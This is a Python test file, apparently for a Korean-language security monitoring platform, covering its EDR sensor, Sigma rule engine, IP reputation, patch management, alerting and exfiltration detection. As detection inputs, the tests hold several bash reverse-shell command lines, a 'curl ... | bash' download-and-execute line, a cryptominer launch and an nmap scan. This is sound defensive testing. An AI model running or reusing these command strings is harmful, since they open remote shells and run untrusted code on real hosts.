# ─────────── IP 평판 (AbuseIPDB) ───────────
from modules.ip_reputation import IPReputation


def _make_rep():
    r = IPReputation(FakeSocketIO(), config={"ABUSEIPDB_MIN_SCORE": 75})
    r.start(demo=True)   # 키 없음 → 데모 모드
    return r


def test_reputation_demo_known_bad_ip_is_malicious():
    r = _make_rep()
    res = r.check("45.155.205.233")   # DEMO_BAD_IPS
    assert res["score"] == 100 and res["source"] == "demo"
    mal, score = r.is_malicious("45.155.205.233")
    assert mal and score == 100


def test_reputation_skips_internal_and_tailscale():
    r = _make_rep()
    assert r.check("192.168.1.10")["source"] == "internal"
    assert r.check("10.0.0.5")["source"] == "internal"
    assert r.check("100.64.140.27")["source"] == "internal"   # CGNAT/Tailscale
    # 내부 IP는 악성 판정/통계에 잡히지 않음
    assert r.is_malicious("192.168.1.10")[0] is False


def test_reputation_cache_hit_counts():
    r = _make_rep()
    r.check("8.8.8.8")
    before = r.stats["cache_hits"]
    r.check("8.8.8.8")   # 두 번째는 캐시
    assert r.stats["cache_hits"] == before + 1


def test_reputation_deterministic_demo_score():
    r = _make_rep()
    a = r.check("203.0.113.55", force=True)["score"]
    b = r.check("203.0.113.55", force=True)["score"]
    assert a == b   # 같은 IP는 항상 같은 점수


def test_reputation_boosts_detector_confidence(tmp_path):
    """악성 평판 IP는 정탐 신뢰도를 끌어올린다."""
    td = ThreatDetector(FakeSocketIO(), config={}, store_path=str(tmp_path / "a.db"))
    td.ip_reputation = _make_rep()
    bad = Alert("PORT_SCAN", "MEDIUM", "45.155.205.233", "10.0.0.1", "평판 테스트")
    clean = Alert("PORT_SCAN", "MEDIUM", "198.51.100.7", "10.0.0.1", "평판 테스트")
    assert td._confidence(bad) > td._confidence(clean)
    assert "ip_reputation" in bad.details


# ─────────── EDR (AI 엔드포인트) ───────────
from modules.edr import EDRSensor


def test_edr_detects_reverse_shell():
    e = EDRSensor(FakeSocketIO(), config={})
    pr = {"pid": 5000, "name": "bash", "parent": "nginx", "user": "www-data",
          "cmdline": "bash -i >& /dev/tcp/45.155.205.233/4444 0>&1",
          "cpu": 0.5, "exe_path": "/bin/bash"}
    risk, ioas = e._evaluate(pr)
    rules = [i["rule"] for i in ioas]
    assert risk >= 90
    assert "IOA-REVSHELL" in rules and "IOA-WEBSHELL" in rules


def test_edr_detects_cryptominer_from_tmp():
    e = EDRSensor(FakeSocketIO(), config={})
    pr = {"pid": 5001, "name": "xmrig", "parent": "systemd", "user": "nobody",
          "cmdline": "/tmp/.x/xmrig -o pool:4444", "cpu": 96.0, "exe_path": "/tmp/.x/xmrig"}
    risk, ioas = e._evaluate(pr)
    sevs = {i["severity"] for i in ioas}
    assert "CRITICAL" in sevs and risk >= 70


def test_edr_benign_process_no_detection():
    e = EDRSensor(FakeSocketIO(), config={})
    pr = {"pid": 900, "name": "python", "parent": "systemd", "user": "me",
          "cmdline": "python trade_bot.py --live", "cpu": 2.0, "exe_path": "/usr/bin/python3"}
    risk, ioas = e._evaluate(pr)
    assert risk == 0 and ioas == []


def test_edr_high_detection_feeds_pipeline(tmp_path):
    td = FakeDetector()
    e = EDRSensor(FakeSocketIO(), config={}, threat_detector=td)
    e._process_snapshot([{"pid": 5002, "name": "bash", "parent": "nginx", "user": "www-data",
                          "cmdline": "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1",
                          "cpu": 0.1, "exe_path": "/bin/bash"}])
    assert any(a["threat_type"] == "EDR_THREAT" for a in td.alerts)


def test_edr_safety_never_kills_pid1_or_self():
    e = EDRSensor(FakeSocketIO(), config={})
    ok, why = e.kill_process(1)
    assert ok is False
    ok2, why2 = e.kill_process(os.getpid())
    assert ok2 is False


# ─────────── 네트워크 관제 ───────────
from modules.net_monitor import NetworkMonitor, _parse_targets, _is_internal, _tcp_probe


def test_net_parse_targets():
    ts = _parse_targets("bot=127.0.0.1:8000;api=10.0.0.5:443;bad=nohost")
    assert len(ts) == 2
    assert ts[0] == {"name": "bot", "host": "127.0.0.1", "port": 8000}


def test_net_internal_classification():
    assert _is_internal("192.168.1.5") and _is_internal("100.64.1.1")  # 사설·Tailscale
    assert not _is_internal("8.8.8.8")


def test_net_malicious_conn_raises_event():
    n = NetworkMonitor(FakeSocketIO(), config={}, ip_reputation=_make_rep())
    # DEMO_BAD_IPS 로 아웃바운드 연결 → 악성 연결 이벤트
    n._finalize(
        [{"laddr": "10.0.0.2:44100", "raddr": "45.155.205.233:4444",
          "rip": "45.155.205.233", "status": "ESTABLISHED", "proc": "bash",
          "external": True, "demo": True}],
        [], {"45.155.205.233"})
    assert n.stats["malicious_conns"] >= 1
    assert any(e["kind"] == "MALICIOUS_CONN" for e in n.events)


def test_net_target_health_probe():
    ok, latency = _tcp_probe("127.0.0.1", 1, timeout=0.5)   # 닫힌 포트
    assert ok is False and latency is None


# ─────────── 취약점 패치 (Ansible) ───────────
from modules.patch_manager import PatchManager, _LINE_RE


def test_patch_apt_line_parse():
    m = _LINE_RE.match(
        "openssl/jammy-security 3.0.2-0ubuntu1.18 amd64 [upgradable from: 3.0.2-0ubuntu1.15]")
    assert m and m.group(1) == "openssl" and "security" in m.group(2)


def test_patch_demo_scan_and_playbook():
    pm = PatchManager(FakeSocketIO(), config={})
    pm.start(demo=True)
    inv = pm.scan()
    assert len(inv) >= 1 and any(p["security"] for p in inv)
    path, content = pm.generate_playbook(security_only=True)
    assert "become: true" in content and "apt" in content
    assert path.endswith(".yml")


def test_patch_apply_blocked_without_flag():
    pm = PatchManager(FakeSocketIO(), config={"PATCH_APPLY_ENABLED": "False"})
    pm.start(demo=True)
    job = pm.run_job(mode="apply", security_only=True)
    assert job["status"] == "blocked"


def test_patch_check_runs():
    """데모 모드는 실제 ansible 을 호출하지 않으므로 결과가 결정적이어야 한다.

    이전 버전은 ansible 설치 여부에 따라 실제 ansible-playbook --check 를
    최대 600초 실행했고, 테스트는 2초만 기다려 환경에 따라 flaky 했다.
    """
    pm = PatchManager(FakeSocketIO(), config={})
    pm.start(demo=True)
    job = pm.run_job(mode="check", security_only=True)
    import time as _t
    for _ in range(40):
        if job["status"] != "running":
            break
        _t.sleep(0.05)
    assert job["status"] == "simulated", f"데모인데 실행 경로를 탐: {job}"
    assert "데모 모드" in job["result"]


def test_patch_demo_never_invokes_ansible(monkeypatch):
    """데모 모드에서 운영 서버로 나가는 subprocess 가 없어야 한다."""
    import modules.patch_manager as pmod

    called = []
    monkeypatch.setattr(pmod.subprocess, "run",
                        lambda *a, **k: called.append(a) or (_ for _ in ()).throw(
                            AssertionError("데모에서 subprocess 호출됨")))
    pm = PatchManager(FakeSocketIO(), config={})
    pm.ansible_bin = "/usr/bin/ansible-playbook"   # 설치된 것처럼 위장
    pm.start(demo=True)
    job = pm.run_job(mode="check", security_only=True)
    import time as _t
    for _ in range(40):
        if job["status"] != "running":
            break
        _t.sleep(0.05)
    assert job["status"] == "simulated"
    assert called == []


# ─────────── 푸시 알림 (ntfy) ───────────
from modules.notifier import Notifier


def test_notify_inactive_when_unconfigured():
    n = Notifier(FakeSocketIO(), config={"NTFY_ENABLED": "False"})
    ok, reason = n.notify("t", "m", severity="CRITICAL")
    assert ok is False and reason == "inactive"
    assert n.active is False


def test_notify_below_threshold_suppressed():
    n = Notifier(FakeSocketIO(), config={"NTFY_ENABLED": "True", "NTFY_TOPIC": "x",
                                         "NTFY_MIN_SEVERITY": "CRITICAL"})
    ok, reason = n.notify("t", "m", severity="LOW")
    assert ok is False and reason == "below_threshold"


def test_notify_cooldown_dedup():
    n = Notifier(FakeSocketIO(), config={"NTFY_MIN_SEVERITY": "INFO", "NTFY_COOLDOWN": 999})
    # 미설정이라 실제 전송은 안 되지만 쿨다운 로직 검증: 첫 호출은 inactive, 두번째는 cooldown
    n.notify("dup", "m", severity="CRITICAL", dedup_key="k1")
    ok, reason = n.notify("dup", "m", severity="CRITICAL", dedup_key="k1")
    assert reason == "cooldown"


def test_notify_true_positive_helper_respects_threshold():
    n = Notifier(FakeSocketIO(), config={"NTFY_MIN_SEVERITY": "CRITICAL"})
    # HIGH 짜리 정탐은 CRITICAL 임계값 미만 → below_threshold
    ok, reason = n.notify_true_positive(
        {"id": 1, "severity": "HIGH", "threat_label": "포트 스캔", "src_ip": "1.2.3.4",
         "description": "x"}, 90, who="AI")
    assert ok is False and reason == "below_threshold"


# ─────────── Sigma 룰 엔진 ───────────
from modules.sigma_engine import SigmaEngine


def _make_sigma(tmp_path, td=None):
    s = SigmaEngine(FakeSocketIO(), config={"SIGMA_RULES_DIR": str(tmp_path / "sigma")},
                    threat_detector=td)
    s.start(demo=True)
    return s


def test_sigma_loads_bundled_rules(tmp_path):
    s = _make_sigma(tmp_path)
    assert s.stats["rules_loaded"] >= 5
    assert s.stats["rules_error"] == 0


def test_sigma_matches_reverse_shell(tmp_path):
    s = _make_sigma(tmp_path)
    m = s.feed_process({"name": "bash", "parent": "nginx", "exe_path": "/bin/bash",
                        "cmdline": "bash -i >& /dev/tcp/45.1.2.3/4444 0>&1",
                        "user": "www-data", "pid": 111})
    titles = [r["title"] for r in m]
    assert any("Reverse Shell" in t for t in titles)


def test_sigma_and_condition(tmp_path):
    """download-exec 룰은 selection_tool AND selection_pipe 둘 다 필요."""
    s = _make_sigma(tmp_path)
    both = s.feed_process({"name": "sh", "parent": "bash", "exe_path": "/bin/sh",
                           "cmdline": "curl http://evil/x.sh | bash", "user": "me", "pid": 1})
    tool_only = s.feed_process({"name": "curl", "parent": "bash", "exe_path": "/usr/bin/curl",
                                "cmdline": "curl http://example.com/index.html", "user": "me", "pid": 2})
    assert any("Download and Execute" in r["title"] for r in both)
    assert not any("Download and Execute" in r["title"] for r in tool_only)


def test_sigma_benign_no_match(tmp_path):
    s = _make_sigma(tmp_path)
    m = s.feed_process({"name": "python", "parent": "systemd", "exe_path": "/usr/bin/python3",
                        "cmdline": "python trade_bot.py --live", "user": "me", "pid": 900})
    assert m == []


def test_sigma_high_match_feeds_pipeline(tmp_path):
    td = FakeDetector()
    s = _make_sigma(tmp_path, td=td)
    s.feed_process({"name": "xmrig", "parent": "systemd", "exe_path": "/tmp/.x/xmrig",
                    "cmdline": "/tmp/.x/xmrig -o pool.minexmr.com:4444", "user": "nobody", "pid": 5})
    assert any(a["threat_type"] == "SIGMA_MATCH" for a in td.alerts)


def test_sigma_toggle_disables_rule(tmp_path):
    s = _make_sigma(tmp_path)
    rid = s.rules[0]["id"]
    assert s.toggle_rule(rid) is False   # 켜져있던 걸 끔
    # 비활성 룰은 매치되지 않음
    for r in s.rules:
        r["enabled"] = (r["id"] != rid)


def test_sigma_test_event_no_pipeline(tmp_path):
    s = _make_sigma(tmp_path)
    out = s.test_event({"category": "process_creation", "Image": "/usr/bin/nmap",
                        "CommandLine": "nmap -sS 10.0.0.0/24"})
    assert any("Scanner" in o["title"] for o in out)


# ─────────── 일일 AI 리포트 ───────────
from modules.daily_report import DailyReport


class _StatSvc:
    def __init__(self, stats): self._s = stats
    def get_status(self): return {"stats": self._s}


class _RepTD:
    def get_alerts(self, limit=500):
        return [
            {"severity": "CRITICAL", "threat_label": "DDoS 공격", "status": "ACK", "src_ip": "45.1.2.3"},
            {"severity": "HIGH", "threat_label": "포트 스캔", "status": "CLOSED", "src_ip": "45.1.2.3"},
            {"severity": "HIGH", "threat_label": "무차별 대입 공격", "status": "OPEN", "src_ip": "8.8.4.4"},
        ]
    def get_stats(self): return {"total_alerts": 3}


class _RepSOAR:
    def get_status(self):
        return {"stats": {"escalated_tp": 2, "auto_closed_fp": 1, "auto_blocked": 1,
                          "blocks_prevented": 3}, "blocked_ips": [{"ip": "45.1.2.3"}]}


def _make_report(tmp_path, ai=None):
    svcs = {"threat_detector": _RepTD(), "soar": _RepSOAR(),
            "edr": _StatSvc({"detections": 4}), "sigma": _StatSvc({"matches": 2}),
            "net_monitor": _StatSvc({"malicious_conns": 1}),
            "authlog": _StatSvc({"brute_alerts": 1})}
    return DailyReport(FakeSocketIO(), {"REPORT_DIR": str(tmp_path / "reports")},
                       ai_analyst=ai, services=svcs)


def test_report_highlights_tp_fp_rate(tmp_path):
    dr = _make_report(tmp_path)
    rep = dr.generate(trigger="test")
    hl = rep["highlights"]
    assert hl["true_positives"] == 2 and hl["false_positives"] == 1
    assert hl["fp_rate"] == 33.3
    assert hl["top_threat"] == "DDoS 공격" and hl["top_source"] == "45.1.2.3"


def test_report_fallback_briefing_without_ai(tmp_path):
    dr = _make_report(tmp_path, ai=None)
    rep = dr.generate(trigger="test")
    assert "규칙 기반" in rep["briefing"] and "권고" in rep["briefing"]
    assert rep["ai_mode"] == "demo"


def test_report_persist_and_reload(tmp_path):
    dr = _make_report(tmp_path)
    r = dr.generate(trigger="test")
    dr2 = _make_report(tmp_path)
    dr2._load_history()
    assert any(x["id"] == r["id"] for x in dr2.reports)
    assert dr2.get_report(r["id"]) is not None


class _FakeAIText:
    available = True
    def generate_text(self, prompt, system=None, max_tokens=1200):
        return "AI 브리핑: 오늘은 조용했습니다."


def test_report_uses_ai_when_available(tmp_path):
    dr = _make_report(tmp_path, ai=_FakeAIText())
    dr.start(demo=True)   # ai_mode 결정
    rep = dr.generate(trigger="test")
    assert rep["briefing"].startswith("AI 브리핑")
    dr.stop()


# ─────────── 퍼플팀 시뮬레이션 ───────────
from modules.purple_team import PurpleTeam, ATTACKER_IP


def _make_purple(tmp_path):
    sig = SigmaEngine(FakeSocketIO(), {"SIGMA_RULES_DIR": str(tmp_path / "sig")})
    sig.start(demo=True)
    edr = EDRSensor(FakeSocketIO(), {})
    rep = IPReputation(FakeSocketIO(), {}); rep.start(demo=True)
    net = NetworkMonitor(FakeSocketIO(), {}, ip_reputation=rep)
    td = FakeDetector()   # 실제 app 처럼 authlog·purple 이 같은 detector 공유
    auth = AuthLogMonitor(FakeSocketIO(), {"AUTH_LOG_PATH": "/nonexistent"},
                          threat_detector=td)
    p = PurpleTeam(FakeSocketIO(), {}, sigma=sig, edr=edr, authlog=auth,
                   ip_reputation=rep, net_monitor=net, threat_detector=td)
    return p


def test_purple_run_all_full_coverage(tmp_path):
    p = _make_purple(tmp_path)
    out = p.run_all()
    assert out["summary"]["total"] == len(p.scenarios)
    # 번들 룰/탐지로 모든 시나리오가 탐지되어야 함
    assert out["summary"]["coverage"] == 100.0
    assert out["summary"]["failed"] == []


def test_purple_uses_testnet_ip(tmp_path):
    p = _make_purple(tmp_path)
    r = p.run_scenario("revshell")
    assert r["detected"] is True
    assert ATTACKER_IP.startswith("203.0.113.")   # RFC5737 TEST-NET


def test_purple_unknown_scenario(tmp_path):
    p = _make_purple(tmp_path)
    assert "error" in p.run_scenario("nope")


# ─────────────────── IOC 워치리스트 ───────────────────

from modules.watchlist import Watchlist


def test_watchlist_crud_and_match(tmp_path):
    wl = Watchlist(socketio=FakeSocketIO(), db_path=str(tmp_path / "w.db"))
    assert wl.add("ip", "9.9.9.9", note="테스트", added_by="kim")["ok"]
    assert not wl.add("ip", "9.9.9.9")["ok"]           # 중복 거부
    assert not wl.add("bad", "x")["ok"]                # 잘못된 유형
    assert wl.match("9.9.9.9") == "ip"
    assert wl.match("1.1.1.1") is None
    items, stats = wl.list_all()
    assert stats["total"] == 1 and stats["by_type"]["ip"] == 1
    wl.close()


def test_watchlist_hit_via_add_alert(tmp_path):
    """워치리스트에 올린 IP 가 알림에 등장하면 히트 집계 + details 표식."""
    wl = Watchlist(socketio=FakeSocketIO(), db_path=str(tmp_path / "w.db"))
    wl.add("ip", "5.5.5.5", added_by="kim")
    td = ThreatDetector(FakeSocketIO(), config={}, store_path=str(tmp_path / "a.db"))
    td.watchlist = wl
    td.report_alert("PORT_SCAN", "HIGH", "5.5.5.5", "10.0.0.1", "워치 IP 스캔")
    alert = td.get_alerts()[0]
    assert "watchlist" in alert["details"]
    assert alert["details"]["watchlist"][0]["value"] == "5.5.5.5"
    items, stats = wl.list_all()
    assert items[0]["hits"] == 1 and stats["hit_total"] == 1
    td.store.close(); wl.close()


def test_incident_json_migrates_to_sqlite_without_removing_source(tmp_path):
    legacy = tmp_path / "incidents.json"
    legacy.write_text(json.dumps({"next_id": 3, "incidents": {"2": {
        "id": 2, "title": "legacy", "threat_type": "TEST", "src_net": "x",
        "severity": "HIGH", "status": "OPEN", "assignee": "", "alert_ids": [],
        "created": "2026-01-01 00:00:00", "updated": "2026-01-01 00:00:00",
        "timeline": []}}}), encoding="utf-8")
    db_path = tmp_path / "incidents.db"
    manager = IncidentManager(store_path=str(db_path))
    assert manager.get(2)["title"] == "legacy"
    assert legacy.exists() and db_path.exists()
    restored = IncidentManager(store_path=str(db_path))
    assert restored.get(2)["status"] == "OPEN"


def test_alert_verdict_and_production_cutover_are_lossless(tmp_path):
    db = tmp_path / "alerts.db"
    store = AlertStore(str(db))
    alert = Alert("SNORT_ALERT", "HIGH", "8.8.8.8", "1.1.1.1", "sid", {
        "source": "snort", "signature_id": 42})
    alert.timestamp = "2025-01-01 00:00:00"
    store.save(alert)
    assert store.set_verdict(alert.id, "TRUE_POSITIVE", "kim", "패킷 원문 확인",
                             "2026-01-01 00:00:00")
    assert store.snort_sid_stats()[0]["tp"] == 1
    assert store.production_cutover("2026-01-01 00:00:00") == 1
    stats = store.retention_stats()
    assert stats["live"] == 0 and stats["archived"] == 1
    assert store.max_id() == alert.id


def test_ip_reputation_real_mode_never_falls_back_to_fake_score():
    rep = IPReputation(FakeSocketIO(), {"ABUSEIPDB_API_KEY": ""})
    rep.start(demo=False)
    result = rep.check("8.8.8.8")
    assert result["source"] == "unavailable"
    assert result["score"] == 0


def test_internal_to_external_exfil_detection_and_allowlist():
    td = ThreatDetector(FakeSocketIO(), {
        "DATA_EXFIL_BYTES_THRESHOLD": 100,
        "DATA_EXFIL_WINDOW_SECONDS": 300,
    }, store_path=None)
    td.analyze_packet("192.168.1.10", "8.8.8.8", 443, "TCP", 101)
    alert = td.get_alerts()[0]
    assert alert["threat_type"] == "DATA_EXFIL"
    assert alert["details"]["direction"] == "internal_to_external"

    allowed = ThreatDetector(FakeSocketIO(), {
        "DATA_EXFIL_BYTES_THRESHOLD": 100, "DATA_EXFIL_ALLOWLIST": "8.8.8.8",
    }, store_path=None)
    allowed.analyze_packet("192.168.1.10", "8.8.8.8", 443, "TCP", 1000)
    assert allowed.get_alerts() == []


def test_soar_exfil_preserves_evidence_without_blocking_internal_host(tmp_path):
    td = make_detector()
    soar = make_soar(tmp_path, td=td)
    soar.incidents = IncidentManager(store_path=str(tmp_path / "exfil.db"))
    alert = Alert("DATA_EXFIL", "CRITICAL", "192.168.1.10", "8.8.8.8", "유출", {
        "bytes_in_window": 800_000_000, "evidence": ["high_volume_egress"]})
    td._add_alert(alert)
    soar._process_data_exfil(alert.to_dict())
    runs = [r for r in soar.executions if r["playbook"] == "PB-DATA-EXFIL"]
    assert runs and runs[-1]["status"] == "completed"
    assert soar.blocked_ips == {}
    assert soar.incidents.get_stats()["total"] == 1
